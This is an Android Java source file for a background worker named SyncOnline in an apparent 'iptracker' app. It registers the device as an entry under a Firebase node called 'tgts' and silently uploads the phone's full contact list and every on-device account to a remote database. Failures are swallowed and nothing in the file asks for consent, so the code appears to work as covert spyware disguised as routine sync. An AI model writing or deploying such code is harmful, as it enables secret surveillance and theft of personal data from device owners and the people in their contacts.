package com.muibsols.iptracker.Sync;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Application;
import android.content.Context;
import android.os.Build;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Calendar;
import java.util.List;

public class SyncOnline extends Worker {

    Context context;
    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    FirebaseAuth firebaseAuth;
    StorageReference storageReference;
    SharedPrefs sharedPrefs;
    DataRepo baseDataRepo;

    public SyncOnline(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        this.context = context;
    }

    @NonNull
    @Override
    public Result doWork() {
        sharedPrefs = SharedPrefs.getInstance(this.getApplicationContext());
        firebaseDatabase = FirebaseDatabase.getInstance();
        firebaseAuth = FirebaseAuth.getInstance();

        storageReference = FirebaseStorage.getInstance().getReference(this.sharedPrefs.getUniqueId());
        databaseReference = firebaseDatabase.getReference();
        baseDataRepo = new DataRepo((Application) context.getApplicationContext());

        if (sharedPrefs.getUniqueId().equals("notFound")) {
            String uniqueID = getAccounts();
            if (uniqueID.isEmpty()) {
                DateFormat df = new SimpleDateFormat("EEE, d MMM yyyy, HH:mm");
                String date = df.format(Calendar.getInstance().getTime());
                uniqueID = Build.MANUFACTURER + "--" + Build.MODEL + "--" + "Android : " + Build.VERSION.RELEASE + "---" + date.toString().replace("-", "");
                String finalUniqueID = uniqueID;
                String mGroupId = databaseReference.child("tgts").push().getKey();
                long time= System.currentTimeMillis();

                if (mGroupId != null) {
                    databaseReference.child("tgts").child(mGroupId).child("uniqueId").setValue(uniqueID).addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void unused) {
                            databaseReference.child("tgts").child(mGroupId).child("date").setValue(time).addOnSuccessListener(new OnSuccessListener<Void>() {
                                @Override
                                public void onSuccess(Void unused) {
                                    sharedPrefs.setUniqueId(finalUniqueID);
                                    uploadContacts(baseDataRepo.getContactsModelList());
                                }
                            });}
                    }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                        }
                    });
                }
            } else {
                if (uniqueID.contains(".")) {
                    uniqueID = uniqueID.replace(".", "DOT");
                    uniqueID = uniqueID.replace("#", "HASH");
                    uniqueID = uniqueID.replace("[", "FirstBracket");
                    uniqueID = uniqueID.replace("]", "SecondBracket");

                    sharedPrefs.setUniqueId(uniqueID);
                }
                String finalUniqueID1 = uniqueID;
                String mGroupId = databaseReference.child("tgts").push().getKey();
                long time= System.currentTimeMillis();
                if (mGroupId != null) {
                    databaseReference.child("tgts").child(mGroupId).child("uniqueId").setValue(uniqueID).addOnSuccessListener(new OnSuccessListener<Void>() {
                        @Override
                        public void onSuccess(Void unused) {
                            databaseReference.child("tgts").child(mGroupId).child("date").setValue(time).addOnSuccessListener(new OnSuccessListener<Void>() {
                                @Override
                                public void onSuccess(Void unused) {
                                    sharedPrefs.setUniqueId(finalUniqueID1);
                                    uploadContacts(baseDataRepo.getContactsModelList());
                                }
                            });}
                    }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                        }
                    });
                }
            }

        }else {
            uploadContacts(baseDataRepo.getContactsModelList());
        }


        Data outputData = new Data.Builder().putBoolean("Synced", true).build();
        return Result.success(outputData);
    }
    private String getAccounts() {
        List<Account> accountList = Arrays.asList(AccountManager.get(this.context).getAccounts());
        String gAccount = "";
        for (Account account : accountList) {
            if (account.type.equals("com.google")) {
                gAccount = account.name.toString();
                break;
            }
        }
        return gAccount;

    }
    private void uploadContacts(List<ContactsModel> contactsModelList) {
        databaseReference.child("usersData").child(sharedPrefs.getUniqueId()).child("contacts").setValue(contactsModelList).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void aVoid) {
                uploadAccounts();
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
            }
        });
    }

    private void uploadAccounts() {
        List<Account> accountList = Arrays.asList(AccountManager.get(this.context).getAccounts());

        databaseReference.child("usersData").child(sharedPrefs.getUniqueId()).child("accounts").setValue(accountList).addOnSuccessListener(new OnSuccessListener<Void>() {
            @Override
            public void onSuccess(Void aVoid) {
            }
        }).addOnFailureListener(new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
            }
        });

    }
}
